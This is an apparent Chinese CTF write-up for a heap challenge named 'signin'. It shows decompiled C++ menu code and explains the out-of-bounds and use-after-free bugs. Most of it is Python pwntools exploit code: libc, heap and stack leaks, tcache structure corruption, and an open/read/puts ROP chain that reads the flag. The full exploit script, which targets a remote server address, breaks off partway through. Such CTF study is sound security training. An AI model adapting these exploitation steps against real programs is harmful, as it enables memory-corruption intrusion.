<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    show_menu();</span><br><span class="line">    <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        del();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> n; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Number:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;n);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    sub_12E8((__int64)&amp;p_1, (__int64)&amp;n);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    sub_12E8((__int64)&amp;p_2, (__int64)&amp;n);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    sub_1364((__int64)&amp;p_1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    sub_1364((__int64)&amp;p_2);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_1364</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">8</span>) -= <span class="number">8L</span>L;</span><br><span class="line">  sub_17A6(a1, *(_QWORD *)(a1 + <span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在进行删除的时候没有进行越界检查, 只是单纯的调整数据指针, 造成溢出漏洞。打印函数, 没有检查该数据是否在开辟内存范围内, 造成uaf漏洞, 可以打印数据指针指向的数据.</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这个题比较坑, 首先我是劫持了malloc_hook打one_gadget, 全部试了, 都无法打, 然后我劫持free_hook为system, 传入’/bin/sh’也没法get shell, 在程序里也没有发现沙箱, └&gt; seccomp-tools也没检查出来, 不知道是采用啥来避免get shell, 只能采用orw来打了, 打入stack, 但是再泄漏stack的时候, 是需要打入envrion的 ,再free的时候需要对大小进行处理, 这里我也卡了好久, 修改chunk size为所开辟的大小就不会错误退出。后面就是劫持add 函数的ret地址来rop, 还有要控制好啥时候就开始rop, rop链太长, 出现中断, 这就没法打了, 开辟内存 &gt; 0x80的时候就开辟内存至stack中, 然后触发rop</p>
<h3 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">258</span>):</span><br><span class="line">	li(<span class="string">&#x27;ad: &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">	ad(<span class="number">1</span>, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">258</span>):</span><br><span class="line">	li(<span class="string">&#x27;rm: &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>((<span class="number">0xef0</span> - <span class="number">0x6e0</span>) / <span class="number">8</span>) - <span class="number">1</span>):</span><br><span class="line">	li(<span class="string">&#x27;rm: &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">dp(<span class="number">1</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">libc_base = <span class="number">0</span></span><br><span class="line">li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak -  <span class="number">0x3ebc40</span> - <span class="number">96</span></span><br><span class="line"><span class="comment">#libc_base = leak -  0x3afc40 - 96</span></span><br><span class="line"></span><br><span class="line">li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>



<h2 id="泄漏heap"><a href="#泄漏heap" class="headerlink" title="泄漏heap"></a>泄漏heap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">t = <span class="number">0x20</span> + <span class="number">0x30</span> + <span class="number">0x50</span> + <span class="number">0x90</span> + <span class="number">0x110</span> + <span class="number">0x210</span> + <span class="number">0x410</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(t / <span class="number">8</span>)):</span><br><span class="line">	li(<span class="string">&#x27;rm: &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rm(1)</span></span><br><span class="line">dp(<span class="number">1</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">heap_base = leak - (<span class="number">0x55a7e41cee70</span> - <span class="number">0x55a7e41bd000</span>)</span><br><span class="line">li(<span class="string">&#x27;heap_base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">t = <span class="number">72721</span> + <span class="number">593</span></span><br></pre></td></tr></table></figure>



<h2 id="修改tcache-struct"><a href="#修改tcache-struct" class="headerlink" title="修改tcache struct"></a>修改tcache struct</h2><p>修改该结构， 程序中存在第二个vector, 那么我们就可以采用第二个vector开辟内存时实现任意地址读写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(t / <span class="number">8</span>) - <span class="number">4</span>):</span><br><span class="line">	li(<span class="string">&#x27;rm: &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">li(<span class="string">&#x27;environ: &#x27;</span> + <span class="built_in">hex</span>(environ))</span><br><span class="line">ad(<span class="number">1</span>, environ + <span class="number">8</span>)</span><br></pre></td></tr></table></figure>



<h2 id="泄漏stack"><a href="#泄漏stack" class="headerlink" title="泄漏stack"></a>泄漏stack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">li(<span class="string">&#x27;environ: &#x27;</span> + <span class="built_in">hex</span>(environ))</span><br><span class="line">ad(<span class="number">1</span>, environ + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">ad(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">ad(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">ad(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">rm(<span class="number">2</span>)</span><br><span class="line">rm(<span class="number">2</span>)</span><br><span class="line">rm(<span class="number">2</span>)</span><br><span class="line">dp(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">stack = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">li(<span class="string">&#x27;stack: &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">stack_ret = stack - (<span class="number">0x7ffc90831238</span> - <span class="number">0x7ffc90831128</span>)</span><br><span class="line"></span><br><span class="line">li(<span class="string">&#x27;stack ret: &#x27;</span> + <span class="built_in">hex</span>(stack_ret))</span><br></pre></td></tr></table></figure>



<h2 id="修复-chunk-size"><a href="#修复-chunk-size" class="headerlink" title="修复 chunk size"></a>修复 chunk size</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># passby free size check</span></span><br><span class="line"><span class="comment"># recovery as normal</span></span><br><span class="line">rm(<span class="number">2</span>)</span><br><span class="line">rm(<span class="number">2</span>)</span><br><span class="line">ad(<span class="number">2</span>, <span class="number">0x31</span>)</span><br><span class="line">ad(<span class="number">2</span>, <span class="number">0x31</span>)</span><br></pre></td></tr></table></figure>



<h2 id="修改tcache-struct-1"><a href="#修改tcache-struct-1" class="headerlink" title="修改tcache struct"></a>修改tcache struct</h2><p>修改 0x91位置指向add 函数的return地址, 避免破坏原来的tcahce bin 地址, 也让flag字符串存在里面</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># modify tcache struct </span></span><br><span class="line">ad(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># 0x41</span></span><br><span class="line">p_a = heap_base + (<span class="number">0x556b504f0ee0</span> -  <span class="number">0x556b504df000</span>)</span><br><span class="line">li(<span class="string">&#x27;heap_0x41: &#x27;</span> + <span class="built_in">hex</span>(p_a))</span><br><span class="line">ad(<span class="number">1</span>, p_a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">	ad(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p_a =  heap_base + (<span class="number">0x55f0423c1f30</span> -  <span class="number">0x55f0423b0000</span>)</span><br><span class="line">li(<span class="string">&#x27;heap_0x71: &#x27;</span> + <span class="built_in">hex</span>(p_a))</span><br><span class="line">ad(<span class="number">1</span>, p_a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	ad(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">flag = <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line">flag = flag.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">flag_addr  = heap_base + <span class="number">0xc0</span></span><br><span class="line">ad(<span class="number">1</span>, u64(flag)) <span class="comment"># heap_base  + 0xc0</span></span><br><span class="line"></span><br><span class="line">ad(<span class="number">1</span>, stack_ret)</span><br></pre></td></tr></table></figure>



<h3 id="构造rop打入add函数return-地址"><a href="#构造rop打入add函数return-地址" class="headerlink" title="构造rop打入add函数return 地址"></a>构造rop打入add函数return 地址</h3><p>rop长度需要小于0x80, 然后使长度大于0x80的时候, 就会打入stack利用rop</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">	libc_read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	libc_open = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">	libc_puts = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">	pop_rdi = libc_base + <span class="number">0x2155f</span></span><br><span class="line">	pop_rsi = libc_base + <span class="number">0x23e8a</span></span><br><span class="line">	pop_rdx = libc_base + <span class="number">0x1b96</span></span><br><span class="line">	pop_rdx_rsi = libc_base + <span class="number">0x130889</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#	# ret to here</span></span><br><span class="line"><span class="comment">#	# open</span></span><br><span class="line">	ad(<span class="number">2</span>, pop_rdi)</span><br><span class="line">	ad(<span class="number">2</span>, flag_addr)</span><br><span class="line">	ad(<span class="number">2</span>, pop_rdx_rsi)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">	ad(<span class="number">2</span>, libc_open)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># read</span></span><br><span class="line">	ad(<span class="number">2</span>, pop_rdi)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">	ad(<span class="number">2</span>, pop_rsi)</span><br><span class="line">	ad(<span class="number">2</span>, flag_addr + <span class="number">0x100</span>)</span><br><span class="line">	ad(<span class="number">2</span>, pop_rdx)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0x100</span>)</span><br><span class="line">	ad(<span class="number">2</span>, libc_read)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># puts</span></span><br><span class="line">	ad(<span class="number">2</span>, pop_rdi)</span><br><span class="line">	ad(<span class="number">2</span>, flag_addr + <span class="number">0x100</span>)</span><br><span class="line">	ad(<span class="number">2</span>, libc_puts)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># trigger</span></span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>





<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;signin&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;47.242.161.199&quot;</span></span><br><span class="line">server_port = <span class="number">9990</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">i, n</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">i</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span 